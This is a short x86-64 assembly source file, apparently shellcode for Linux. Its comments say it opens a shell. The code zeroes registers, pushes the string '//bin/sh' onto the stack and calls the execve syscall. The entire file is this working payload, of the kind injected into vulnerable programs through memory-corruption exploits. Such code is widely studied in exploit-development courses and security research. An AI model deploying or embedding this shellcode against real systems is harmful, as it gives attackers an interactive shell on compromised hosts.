;Author: @Erv00
;It opens a shell on linux
;exec(\bin\sh)
section .text
   global _start
_start:
   xor rax, rax
   xor rsi, rsi			;zero out rsi
   xor rdx, rdx			;zero out rdx
   mov rdi, 0x68732f6e69622f2f	;mov hs/nib// into rdi
   push rdx			;push 0x00 to stack
   push rdi			;push rdi to stack
   mov rdi, rsp			;get addres of //bin/sh,0x00
   mov al, 59			;execve syscall: 59
   syscall			;syscall

